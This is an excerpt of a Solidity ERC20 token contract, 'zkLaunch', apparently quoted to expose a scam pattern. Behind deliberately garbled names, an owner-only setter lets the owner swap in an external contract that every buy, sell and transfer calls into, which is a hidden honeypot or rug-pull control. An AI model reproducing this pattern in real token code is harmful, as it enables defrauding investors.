...
contract TokenM is ERC20 {
    ...
    IUserAmountfuuset public fuuset;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("zkLaunch", "ZKL") {
    ...
    function cuiongerBuuingRsst(IUserAmountfuuset _fuuset) public onlyOwner {
        fuuset = _fuuset;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                fuuset.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				fuuset.addOutAmount(from, amount);
            }else{
                fuuset.addOutAmount(from, amount);
                takeFee = false;
            }
